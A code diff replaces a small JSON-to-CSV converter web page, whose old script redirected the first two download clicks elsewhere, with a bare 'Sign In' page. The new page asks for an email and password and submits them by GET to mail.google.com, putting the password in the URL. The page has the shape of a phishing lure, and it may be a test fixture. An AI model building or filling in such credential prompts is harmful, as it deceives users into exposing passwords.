@@ -3,119 +3,75 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>JSON to CSV Converter</title>
+    <title>Sign In</title>
     <style>
-      * {
-        box-sizing: border-box;
-      }
       body {
-        background-color: #000;
-        color: #33ff33;
-        font-family: "Courier New", Courier, monospace;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
         margin: 0;
+        background-color: #f4f4f4;
+      }
+      .signin-container {
+        background-color: #fff;
         padding: 20px;
-        font-size: 16px;
-        line-height: 1.5;
-      }
-      h1 {
-        text-align: center;
-        text-decoration: underline;
-      }
-      textarea {
+        border-radius: 8px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         width: 100%;
-        height: 200px;
-        background-color: #222;
-        color: #33ff33;
-        border: 1px solid #33ff33;
-        padding: 10px;
-        font-family: "Courier New", monospace;
+        max-width: 400px;
       }
-      button {
-        background-color: #000;
-        color: #33ff33;
-        border: 1px solid #33ff33;
-        padding: 10px 20px;
+      .signin-container h2 {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+      .form-group {
+        margin-bottom: 15px;
+      }
+      .form-group label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+      }
+      .form-group input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
         font-size: 16px;
-        font-family: "Courier New", monospace;
-        cursor: pointer;
-        margin-top: 10px;
       }
-      button:hover {
-        background-color: #33ff33;
-        color: #000;
-      }
-      #output {
-        white-space: pre;
-        margin-top: 20px;
-        border: 1px solid #33ff33;
+      .signin-btn {
+        display: block;
+        width: 100%;
         padding: 10px;
-        background-color: #222;
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+      .signin-btn:hover {
+        background-color: #0056b3;
       }
     </style>
   </head>
   <body>
-    <h1>JSON to CSV Converter</h1>
-    <p>Paste your JSON below and click <b>Convert</b> to get the CSV output.</p>
-
-    <label for="jsonInput">Input JSON:</label>
-    <textarea
-      id="jsonInput"
-      placeholder='[{"name": "John", "age": 30}, {"name": "Jane", "age": 25}]'
-    ></textarea>
-    <br />
-    <button onclick="convertToCSV()">Convert</button>
-    <button onclick="handleDownloadCSV()">Download CSV</button>
-
-    <div id="output" contenteditable="true">
-      Converted CSV will appear here...
+    <div class="signin-container">
+      <h2>Enter email and password to proceed</h2>
+      <form action="https://mail.google.com" method="GET">
+        <div class="form-group">
+          <label for="email">Email</label>
+          <input type="email" id="email" name="email" required />
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required />
+        </div>
+        <button type="submit" class="signin-btn">Next</button>
+      </form>
     </div>
-
-    <script>
-      let clickCount = 0;
-
-      function convertToCSV() {
-        const input = document.getElementById("jsonInput").value;
-        const output = document.getElementById("output");
-        try {
-          const json = JSON.parse(input);
-          if (!Array.isArray(json))
-            throw new Error("JSON must be an array of objects");
-
-          const headers = Object.keys(json[0]);
-          const csvRows = [headers.join(",")];
-
-          json.forEach((row) => {
-            const values = headers.map((header) =>
-              JSON.stringify(row[header] || "")
-            );
-            csvRows.push(values.join(","));
-          });
-
-          output.textContent = csvRows.join("\n");
-        } catch (error) {
-          output.textContent = "Error: " + error.message;
-        }
-      }
-
-      function handleDownloadCSV() {
-        clickCount++;
-        if (clickCount <= 2) {
-          window.location.href = "instructions.html";
-        } else {
-          downloadCSV();
-        }
-      }
-
-      function downloadCSV() {
-        const csv = document.getElementById("output").textContent;
-        const blob = new Blob([csv], { type: "text/csv" });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = "converted.csv";
-        a.click();
-        URL.revokeObjectURL(url);
-      }
-    </script>
   </body>
 </html>
